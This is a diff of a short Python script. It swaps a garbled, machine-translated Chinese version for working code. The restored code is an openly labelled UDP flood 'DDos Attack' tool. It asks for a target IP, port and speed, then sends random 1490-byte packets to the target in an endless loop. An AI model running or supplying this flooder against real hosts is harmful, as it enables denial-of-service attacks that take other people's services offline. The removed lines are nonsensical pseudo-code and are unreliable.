@@ -1,45 +1,45 @@
-#python3
+# python3
 
-进口sys
-进口操作系统
-进口时间
-进口插座
-进口随机
-#代码时间
-从……起datetime进口datetime
-now=日期时间。现在()
-小时=现在。小时
-分钟=现在。分钟
-天=现在。一天
-月=现在。月
-年=现在。年
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
 ##############
-sock=插座。插座(插座。AF_INET，插座。sock_Dgram)
-字节=随机。_urandom(1490)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 #############
 
-操作系统。系统("清除")
-操作系统。系统("figlet DDos攻击")
-打印 (" ")
-打印 ("/---------------------------------------------------\")
-打印 ("|   作者          : 长歌不高冷                       |")
-打印 ("|作者GitHub:https://github.com/长歌不高冷|")
-打印 ("|kali-QQ:1130538060|")
-打印 ("|版本：v1.1.0|")
-打印 ("|   严禁转载，程序教程仅发布在CSDN（用户长歌不高冷）   |")
-打印 ("\---------------------------------------------------/")
-打印 (" ")
-打印 ("-----------------[请勿用于违法用途]-----------------")
-打印 (" ")
-IP=输入("请输入IP：")
-端口=int(输入("攻击端口      : "))
-SD=int(输入("攻击速度(1~1000) : "))
-操作系统。系统("清除")
+os.system("clear")
+os.system("figlet DDos Attack")
+print (" ")
+print ("/---------------------------------------------------\ ")
+print ("|   作者          : Andysun06                       |")
+print ("|   作者github    : https://github.com/Andysun06    |")
+print ("|   kali-QQ学习群 : 909533854                       |")
+print ("|   版本          : V1.1.0                          |")
+print ("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
+print ("\---------------------------------------------------/")
+print (" ")
+print (" -----------------[请勿用于违法用途]----------------- ")
+print (" ")
+ip = input("请输入 IP     : ")
+port = int(input("攻击端口      : "))
+sd = int(input("攻击速度(1~1000) : "))
+os.system("clear")
 
-发送=0
-在……期间 正确:
-袜子。sendto(字节，(IP，端口))
-发送=发送+1
-     打印 ("已发送%s个数据包到%s端口%d"%(发送，ip，端口))
-时间。睡((1000-SD)/2000)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
+     time.sleep((1000-sd)/2000)
